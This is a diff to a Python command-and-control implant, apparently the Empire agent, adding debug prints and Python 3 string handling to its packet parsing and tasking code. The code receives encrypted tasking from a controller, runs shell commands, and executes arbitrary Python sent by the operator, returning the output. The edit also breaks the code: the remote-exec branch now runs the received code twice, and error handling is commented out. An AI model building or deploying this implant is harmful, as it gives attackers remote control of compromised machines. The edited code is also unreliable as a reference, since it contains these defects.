@@ -144,20 +144,26 @@ def build_response_packet(taskingID, packetData, resultID=0):
         |  2   |         2          |    2     |    2    |   4    | <Length>  |
         +------+--------------------+----------+---------+--------+-----------+
     """
-
+    print('response packet')
+    print('taskingID: ' + str(type(taskingID)))
+    print('resultID: ' + str(type(resultID)))
     packetType = struct.pack('=H', taskingID)
     totalPacket = struct.pack('=H', 1)
     packetNum = struct.pack('=H', 1)
     resultID = struct.pack('=H', resultID)
-    
+    print('response packet 152')
     if packetData:
-        packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8','ignore'))
+        if(isinstance(packetData, str)):
+            packetData = base64.b64encode(packetData.encode('utf-8', 'ignore'))
+        else:
+            packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8','ignore'))
         if len(packetData) % 4:
             packetData += '=' * (4 - len(packetData) % 4)
-            
+        print('if packet data')
         length = struct.pack('=L',len(packetData))
         return packetType + totalPacket + packetNum + resultID + length + packetData
     else:
+        print('else packet data')
         length = struct.pack('=L', 0)
         return packetType + totalPacket + packetNum + resultID + length
 
@@ -186,25 +192,32 @@ def parse_task_packet(packet, offset=0):
 
     # print "parse_task_packet"
 
-    try:
-        packetType = struct.unpack('=H', packet[0+offset:2+offset])[0]
-        totalPacket = struct.unpack('=H', packet[2+offset:4+offset])[0]
-        packetNum = struct.unpack('=H', packet[4+offset:6+offset])[0]
-        resultID = struct.unpack('=H', packet[6+offset:8+offset])[0]
-        length = struct.unpack('=L', packet[8+offset:12+offset])[0]
-        packetData = packet[12+offset:12+offset+length]
-        remainingData = packet[12+offset+length:]
-        return (packetType, totalPacket, packetNum, resultID, length, packetData, remainingData)
-    except Exception as e:
+    if(isinstance(packet, str)):
+        packet = packet.encode('UTF-8')
+
+    #try:
+    print(str(type(packet)))
+    packetType = struct.unpack('=H', packet[0+offset:2+offset])[0]
+    totalPacket = struct.unpack('=H', packet[2+offset:4+offset])[0]
+    print("parse 193")
+    packetNum = struct.unpack('=H', packet[4+offset:6+offset])[0]
+    resultID = struct.unpack('=H', packet[6+offset:8+offset])[0]
+    length = struct.unpack('=L', packet[8+offset:12+offset])[0]
+    print("parse 197")
+    packetData = packet[12+offset:12+offset+length]
+    remainingData = packet[12+offset+length:]
+
+    return (packetType, totalPacket, packetNum, resultID, length, packetData, remainingData)
+    #except Exception as e:
         # print "parse_task_packet exception:",e
-        return (None, None, None, None, None, None, None)
+     #   return (None, None, None, None, None, None, None)
 
 
 def process_tasking(data):
     # processes an encrypted data packet
     #   -decrypts/verifies the response to get
     #   -extracts the packets and processes each
-
+    print("processing tasking")
     try:
         # aes_decrypt_and_verify is in stager.py
         tasking = aes_decrypt_and_verify(key, data)
@@ -221,7 +234,7 @@ def process_tasking(data):
             resultPackets += result
 
         packetOffset = 12 + length
-
+        print('tasking 231')
         while remainingData and remainingData != '':
             (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking, offset=packetOffset)
             result = process_packet(packetType, data, resultID)
@@ -242,6 +255,7 @@ def process_job_tasking(result):
     # process job data packets
     #  - returns to the C2
     # execute/process the packets and get any response
+    print('job tasking')
     try:
         resultPackets = ""
         if result:
@@ -254,12 +268,15 @@ def process_job_tasking(result):
 
 
 def process_packet(packetType, data, resultID):
-
+    print('processing packet')
+    if(isinstance(data, bytes)):
+        data = data.decode('UTF-8')
     try:
         packetType = int(packetType)
     except Exception as e:
         return None
-
+    print('process 270')
+    print(packetType)
     if packetType == 1:
         # sysinfo request
         # get_sysinfo should be exposed from stager.py
@@ -267,19 +284,28 @@ def process_packet(packetType, data, resultID):
 
     elif packetType == 2:
         # agent exit
-
+        print(str(type(resultID)))
         send_message(build_response_packet(2, "", resultID))
         agent_exit()
 
     elif packetType == 40:
         # run a command
-        parts = data.split(" ")
-        
+        print('type 40')
+        try:
+            parts = data.split(" ")
+        except Exception as e:
+            print(e)
         if len(parts) == 1:
-            data = parts[0]
-            resultData = str(run_command(data))
-            return build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID)
+            try:
+                print('type 40: 1')
+                data = parts[0]
+                resultData = str(run_command(data))
+                return build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID)
+            except Exception as e:
+                print(e)
         else:
+            print('type 40: 2')
+            print(str(type(parts)))
             cmd = parts[0]
             cmdargs = ' '.join(parts[1:len(parts)])
             resultData = str(run_command(cmd, cmdargs=cmdargs))
@@ -383,17 +409,24 @@ def process_packet(packetType, data, resultID):
 
     elif packetType == 100:
         # dynamic code execution, wait for output, don't save outputPicl
-        try:
-            buffer = StringIO()
-            sys.stdout = buffer
-            code_obj = compile(data, '<string>', 'exec')
-            exec(code_obj, globals())
-            sys.stdout = sys.__stdout__
-            results = buffer.getvalue()
-            return build_response_packet(100, str(results), resultID)
-        except Exception as e:
-            errorData = str(buffer.getvalue())
-            return build_response_packet(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
+        #try:
+        print('type 100')
+        print(str(type(data)))
+        buffer = StringIO()
+        print('type 100: 397')
+        sys.stdout = buffer
+        code_obj = compile(data, '<string>', 'exec')
+        exec(code_obj, globals())
+        sys.stdout = sys.__stdout__
+        code_obj = compile(data, '<string>', 'exec')
+        exec(code_obj, globals())
+        print(code_obj)
+        print('type 100: 403')
+        results = buffer.getvalue()
+        return build_response_packet(100, str(results), resultID)
+        #except Exception as e:
+         #   errorData = str(buffer.getvalue())
+          #  return build_response_packet(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
 
     elif packetType == 101:
         # dynamic code execution, wait for output, save output
@@ -724,7 +757,9 @@ class decompress(object):
 
 def agent_exit():
     # exit for proper job / thread cleanup
+    print('exiting agent')
     if len(jobs) > 0:
+        print('jobs still running')
         try:
             for x in jobs:
                 jobs[int(x)].kill()
